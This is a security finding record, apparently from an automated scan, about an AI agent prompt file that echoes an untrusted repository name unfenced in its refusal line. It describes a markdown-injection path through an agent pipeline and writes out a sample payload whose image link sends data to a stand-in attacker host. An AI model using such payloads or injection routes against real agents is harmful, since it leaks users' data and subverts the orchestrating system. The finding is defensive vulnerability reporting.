...
## S-2026-09-08-001 — repo-indexer.md's Step 1 validation-failure line echoes the rejected, attacker-controlled `<repo>` value unfenced

```yaml
id: S-2026-09-08-001
discovered_at: 2026-09-08T11:05:06Z
run_id: 34217971214
target_repo: ievo-ai/skills
title: agents/repo-indexer.md Step 1's "FAILED: <repo> — invalid owner/repo format" refusal line (line 68) substitutes the untrusted, attacker-influenceable repo string verbatim with no excerpt-containment fencing, even though the same value's whole reason for going through this branch is that it contains characters outside the OWNER_REPO_RE charset (i.e. it failed validation specifically because it can carry Markdown-active bytes)
status: issued
issue_url: https://github.com/ievo-ai/skills/issues/695
cwe: CWE-79
confidence: medium
location: plugins/ievo/agents/repo-indexer.md:68 (Step 1, validation-failure branch)
```

Directly re-read this run (4-module `/ievo:vuln-scan` dogfooding, agents+commands dispatch, independently re-verified against current source): `repo-indexer.md` Step 1's own commentary (lines ~55-64) states the `repo` value is sourced from `discover.mjs`'s `candidates[].source_repo` field — pulled from the public, externally-writable skills.sh API / marketplace catalog, not something "the user typed and personally vetted." Step 1 validates `repo` against `^[A-Za-z0-9](?:[A-Za-z0-9-]{0,38})/[A-Za-z0-9._-]{1,100}$` (matching `scan_repo.mjs`'s own `OWNER_REPO_RE`) before ever building Step 2's Bash command — this correctly blocks CWE-78 command injection. But on validation failure the agent's entire output is the literal line `FAILED: <repo> — invalid owner/repo format` with `<repo>` substituted raw, unwrapped in any code span (line 68). Because the branch is reached exactly when `repo` contains a character outside the allowed charset, a catalog entry crafted as `evil-owner/repo![x](https://attacker.example/beacon.png?d=leak)` fails validation as designed (no CWE-78 — Step 2's Bash line is never built) while still reaching this echo unfenced. Per Step 3, this line is returned "verbatim as your only response. No commentary, no markdown" to the dispatching orchestrator — the same rendering-surface pattern `security-auditor.md`'s own "Excerpt containment for `candidate`/`alternative_suggestion`" note already protects for its structurally identical `<owner>/<repo>@<item-name>` field, and `vuln-scanner.md` protects unconditionally for its `file`/`function`/`module` fields — but `repo-indexer.md` has no equivalent note anywhere in the file for this line. Distinct from already-open `skills#659` (covers Step 4's "Other nonzero" branch, a different site — the stderr echo from a `scan_repo.mjs` failure — not this Step 1 validation-refusal line) and from closed `skills#675`/in-flight `skills#598` (covers `security-auditor.md`'s `flags[].file` field, a different file and field entirely — not re-filed here, see Deferred findings).
